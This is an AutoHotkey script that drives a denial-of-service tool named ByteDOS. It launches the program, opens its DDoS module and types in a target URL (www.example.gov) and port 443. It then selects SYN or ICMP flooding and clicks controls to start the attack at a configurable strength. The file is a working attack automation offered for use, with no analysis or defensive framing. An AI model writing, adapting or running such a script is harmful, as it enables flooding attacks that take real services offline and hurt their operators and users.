#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

bytedos_path = C:\Temp\ByteDOS\ByteDOS v3.2.exe
target_url = www.example.gov
target_port = 443
attack_type = ICMP // SYN or ICMP
attack_strength = 2

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute ByteDOS
Run, %bytedos_path%

// Give focus to ByteDOS window
WinActivate, ByteDOS
WinWaitActive, ByteDOS

// Run DDoS module
Send {TAB}
Send {Enter}

// Give focus to ByteDOS attacker window
WinActivate, ByteDOS - 1
WinWaitActive, ByteDOS - 1

// Target URL
Send {TAB}
Send {TAB}
Send {TAB}
Send {TAB}
Loop 15 {
	Send {Del}
}
SendInput, %target_url%

// Target port
Send {TAB}
Send {Del}
Send {Del}
SendInput %target_port%

// Attack type
Send {TAB}
if (attack_type = "ICMP") {	
	Send {Right}
}

// Execute attack
MouseMove, 54, 243
Click
MouseMove, 54, 274
if (attack_strength > 1) {
	Click
}
MouseMove, 54, 305
if (attack_strength > 2) {
	Click
}